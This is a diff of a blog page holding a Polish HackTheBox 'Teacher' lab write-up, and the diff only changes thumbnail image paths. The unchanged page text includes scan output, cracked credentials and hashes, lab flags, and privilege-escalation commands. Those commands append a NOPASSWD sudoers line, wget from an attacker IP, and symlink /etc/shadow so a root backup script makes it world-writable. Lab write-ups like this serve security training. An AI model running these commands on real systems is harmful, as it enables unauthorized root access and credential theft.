@@ -61,13 +61,13 @@
 <meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/teacher/" />
-<meta property="og:image" content="https://lavatann.github.io/Teacher.png" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://lavatann.github.io/thumbnails/Teacher.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-09-13T00:00:00&#43;00:00" />
 <meta property="article:modified_time" content="2021-09-13T00:00:00&#43;00:00" />
 <meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/encrypted/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/logforge/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/shibboleth/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/backdoor/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/secret/" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://lavatann.github.io/Teacher.png" />
+<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Teacher.png" />
 <meta name="twitter:title" content="Teacher - HackTheBox"/>
 <meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>
 
@@ -105,7 +105,7 @@
   "articleBody": "Teacher - 13.09.2021  NMap PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool  FeroxBuster 403 11l 32w 291c http://10.10.10.153/.hta 403 11l 32w 296c http://10.10.10.153/.htaccess 403 11l 32w 296c http://10.10.10.153/.htpasswd 301 9l 28w 310c http://10.10.10.153/css 301 9l 28w 312c http://10.10.10.153/fonts 301 9l 28w 313c http://10.10.10.153/images 200 249l 747w 8028c http://10.10.10.153/index.html 301 9l 28w 317c http://10.10.10.153/javascript 301 9l 28w 309c http://10.10.10.153/js 301 9l 28w 313c http://10.10.10.153/manual 301 9l 28w 313c http://10.10.10.153/moodle 403 11l 32w 297c http://10.10.10.153/phpmyadmin 403 11l 32w 300c http://10.10.10.153/server-status  MoodleScan  Informations Moodle v3.4.1 Teacher: Giovanni Chhatta  Plik w /images/  BurpSuite cracking Giovanni:Th4C00lTheacha#\n www-data  Linpeas root:Welkom1!\n mdl_users guest $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO admin $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 giovanni $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO Giovannibak 7a860966115182402ed06375cf0a22af giovanni:expelled\nuser.txt\nfa9ae187462530e841d9e61936648fa7\n Privilege Escalation Pspy giovanni@teacher:/home$ cat /usr/bin/backup.sh #!/bin/bash cd /home/giovanni/work; tar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R; -rwxr-xr-x 1 root root 138 Jun 27 2018 backup.sh\n echo 'echo \"giovanni ALL=(root) NOPASSWD: ALL\"  /etc/sudoers'  test.sh echo 'chmod 777 /root/root.txt'  test.sh echo 'wget http://10.10.14.6/test'  test.sh  Inny sposób - działa Eskalacja przez wildpoint *\ncd /home/giovanni/work rm -R tmp ln -s /etc/shadow /home/giovanni/work/tmp Stworzony link pozwolił na chmod 777 na /etc/shadow\nZamiana hasla roota na haslo usera\nroot.txt\n4f3a83b42ac7723a508b8ace7b8b1209\n",
   "wordCount" : "200",
   "inLanguage": "en",
-  "image":"https://lavatann.github.io/Teacher.png","datePublished": "2021-09-13T00:00:00Z",
+  "image":"https://lavatann.github.io/thumbnails/Teacher.png","datePublished": "2021-09-13T00:00:00Z",
   "dateModified": "2021-09-13T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -202,7 +202,7 @@
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/Teacher.png" alt="">
+<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Teacher.png" alt="">
         
 </figure><div class="toc">
     <details >
